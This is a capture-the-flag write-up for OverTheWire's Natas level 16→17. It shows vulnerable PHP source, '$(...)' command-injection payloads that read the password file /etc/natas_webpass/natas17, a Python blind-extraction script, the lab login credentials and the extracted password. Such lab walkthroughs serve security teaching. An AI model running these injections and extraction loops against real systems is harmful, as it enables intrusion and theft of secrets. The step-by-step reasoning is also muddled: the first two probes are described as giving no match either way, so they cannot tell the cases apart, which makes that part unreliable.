# Natas Level 16 → 17

## Goal

Like level 10, a grep-based search filters shell metacharacters — but this time the filter is stricter. You get command execution via **`$(...)` command substitution**, which is still allowed, and you use the response body to tell whether a submitted probe succeeded.

## Concepts you'll learn

- Bash **command substitution** — `$(cmd)` runs `cmd` and drops its output in place
- Boolean inference in a search app: the dictionary word "African" either appears in output or it doesn't, depending on whether your injected command modified the grep input
- The general blind-extraction pattern, reused from level 15 but with a different side-channel

## Walkthrough

### 1. View the source

```php
if(preg_match('/[;|&`\'"]/', $key)) {
    // blocked
} else {
    passthru("grep -i \"$key\" dictionary.txt");
}
```

The filter kills `;`, `|`, `&`, backtick, and quotes. But `$(...)` is fine, and `$key` still sits inside double quotes in a shell command.

### 2. Injection shape

Submit as `needle`:

```
$(grep -c ^X /etc/natas_webpass/natas17)African
```

The shell evaluates the `$(...)` first:

- `grep -c ^X /etc/natas_webpass/natas17` — counts lines starting with `X` in the password file. Output is `1` if the password starts with `X`, else `0`.
- The outer grep then runs `grep -i "0African"` (or `"1African"`) against the dictionary.

If the password doesn't start with `X`, the grep pattern is `0African` → no matches → the word "African" does **not** appear in the response. If it does start with `X`, the pattern is `1African` → still no matches.

Better probe: match when the password starts with a specific letter `X`:

```
$(if grep -q ^C /etc/natas_webpass/natas17; then echo African; fi)Zebra
```

If the password starts with `C`, the grep pattern becomes `AfricanZebra` (dictionary doesn't contain that — no match in response). If it doesn't, the pattern becomes `Zebra` (dictionary doesn't contain that either).

A cleaner formulation is to use a known dictionary word as the signal:

```
$(grep -q ^X /etc/natas_webpass/natas17 && echo Africa)
```

If the grep matches, the outer grep receives `Africa` and the response contains `African` (the dictionary has it). If not, the outer grep receives `""` and matches everything.

Axcheron's approach: use **response size** as the side-channel — if the outer grep's pattern is empty (`""`), it matches **every** dictionary line and the page is long; if it's non-empty and not in the dictionary, the page is short.

### 3. Automate it

Python:

```python
import requests
from requests.auth import HTTPBasicAuth

URL = "http://natas16.natas.labs.overthewire.org/index.php"
AUTH = HTTPBasicAuth("natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")
CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

password = ""
while True:
    found = None
    for c in CHARS:
        # Inject: if password starts with '{password}{c}', make outer grep match nothing.
        # else make it match everything (a very long page).
        payload = f'$(grep -q ^{password}{c} /etc/natas_webpass/natas17 && echo IMPOSSIBLESTRING)x'
        r = requests.post(URL, data={"needle": payload}, auth=AUTH)
        # if it matched, outer grep runs 'grep IMPOSSIBLESTRINGx' → no hits → short page
        if len(r.text) < 1000:  # tune threshold
            found = c
            break
    if not found:
        break
    password += found
    print(password)
```

Run it to extract:

```
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```

## The answer

The password for `natas17` is:

**`8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <http://natas16.natas.labs.overthewire.org/>
